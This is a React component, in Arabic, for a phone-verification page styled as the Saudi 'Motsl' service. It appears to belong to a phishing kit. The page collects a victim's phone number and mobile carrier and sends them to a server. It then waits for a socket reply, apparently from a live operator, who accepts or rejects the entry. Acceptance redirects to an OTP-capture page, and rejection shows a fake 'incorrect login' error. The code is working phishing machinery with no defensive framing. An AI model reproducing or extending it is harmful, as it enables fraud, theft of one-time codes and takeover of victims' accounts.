import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
const Motsl = () => {
  const [phone, setPhone] = useState(null);
  const [network, setNetwork] = useState(null);
  const [load, setLoad] = useState(false);
  const [error, setError] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const id = query.get("id");
  const handleSubmit = async (e) => {
    setLoad(true);
    e.preventDefault();
    if (!network) {
      setLoad(false);
      return window.alert("برجاء اختيار مشغل شبكة الجوال");
    } else {
      try {
        await axios
          .post(api_route + "/motsl/" + id, {
            MotslPhone: phone,
            MotslNetwork: network,
          })
          .then(() => socket.emit("motsl", id));
      } catch (error) {}
    }
  };

  socket.on("acceptMotsl", (data) => {
    if (data === id) {
      setLoad(false);
      setError(false);
      window.location.href = `/motslOtp?data=${JSON.stringify({
        phone,
        network,
        id,
      })}`;
    }
  });

  socket.on("declineMotsl", (data) => {
    if (data === id) {
      setLoad(false);
      setError(true);
    }
  });

  return (
    <div className="w-full flex flex-col items-center justify-center  relative gap-y-5">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">يتم المعالجة</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      {/* <img src="/etislat.jpg" /> */}
      <form
        onSubmit={handleSubmit}
        className="w-full border rounded-md mx-1   py-5 px-4 shadow-md my-2 h-fit "
        dir="rtl"
      >
        <span className="text-lg font-bold">تأكيد رقم هاتف مقدم الطلب</span>
        <div className="flex w-full items-center  flex-col my-2   " dir={`rtl`}>
          <span className="w-full text-right text-gray-700 text-base">
            {" "}
            تم تسجيل بيانات الوثيقة بنجاح !
          </span>
          <span className="w-full text-right text-gray-700 text-sm">
            لمتابعة الطلب يرجي إدخال رقم مقدم الطلب بشكل صحيح
          </span>
        </div>

        <div className="flex flex-col gap-y-2 items-center">
          <span className=" text-base w-full text-right  font-bold text-gray-600">
            رقم الجوال *{" "}
          </span>
          <input
            required
            type="text"
            minLength={10}
            maxLength={10}
            value={phone}
            inputMode="numeric"
            onChange={(e) => setPhone(e.target.value)}
            placeholder="05********"
            className="p-2 border-2 text-right w-full rounded-md  outline-blue-500"
          />
        </div>
        <div className="flex flex-col gap-y-2 items-center my-2">
          <span className=" text-base w-full text-right  font-bold text-gray-600">
            {" "}
            مشغل شبكة الجوال * :{" "}
          </span>
          <select
            required
            value={network}
            inputMode="numeric"
            onChange={(e) => setNetwork(e.target.value)}
            className="p-2 border-2 text-right w-full rounded-md  outline-blue-500"
          >
            <option>اختر مشغل الشبكة </option>
            <option>Zain</option>
            <option>Mobily</option>
            <option>STC</option>
            <option>Salam</option>
            <option>Virgin</option>
            <option>Redbull</option>
          </select>
        </div>
        {error ? (
          <div className="w-full text-center text-red-500 text-xl">
            بيانات الدخول غير صحيحة
          </div>
        ) : (
          ""
        )}
        <div className="w-full flex justify-center items-center">
          <button
            className="text-white bg-[#146394] w-11/12 text-lg py-2  mt-5 rounded-md "
            type="submit"
          >
            {" "}
            تأكيد
          </button>
        </div>
      </form>
    </div>
  );
};

export default Motsl;
